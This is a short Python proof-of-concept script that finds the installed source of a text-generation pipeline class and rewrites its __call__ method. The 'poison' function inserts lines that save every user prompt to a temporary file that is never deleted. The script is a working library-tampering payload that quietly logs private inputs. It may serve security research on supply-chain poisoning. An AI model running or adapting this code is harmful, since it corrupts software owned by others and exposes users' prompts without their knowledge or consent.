import inspect

import pathlib
import sys


def poison():
    try:
        import <MODULE>.pochelper as pochelper
        module_path = pochelper.target
    except Exception as e:
        return
    class_name = 'TextGenerationPipeline(Pipeline)'
    function_name = '__call__'

    lines = module_path.read_text().splitlines()

    class_line = 0
    class_definition = ''

    function_line = 0
    function_definition = ''

    return_lint = 0
    return_statement = ''
    for idx, line in enumerate(lines):
        if f"class {class_name}:" in line:
            class_line = idx + 1
            class_definition = line
        if f"def {function_name}" in line:
            function_line = idx + 1
            function_definition = line
        if function_definition and class_definition:
            if '        return ' in line:
                return_line = idx + 1
                return_statement = line
                break
    load_lib = "        import tempfile"
    context  = "        with tempfile.NamedTemporaryFile(mode='w+', prefix='TextGeneration', delete=False) as temp_file:"
    writer   = "            temp_file.write(text_inputs)"
    new_code = [load_lib, context, writer]

    lines[return_line-1:return_line-1] = new_code
    with open(module_path, 'w') as file:
        file.write('\n'.join(lines))
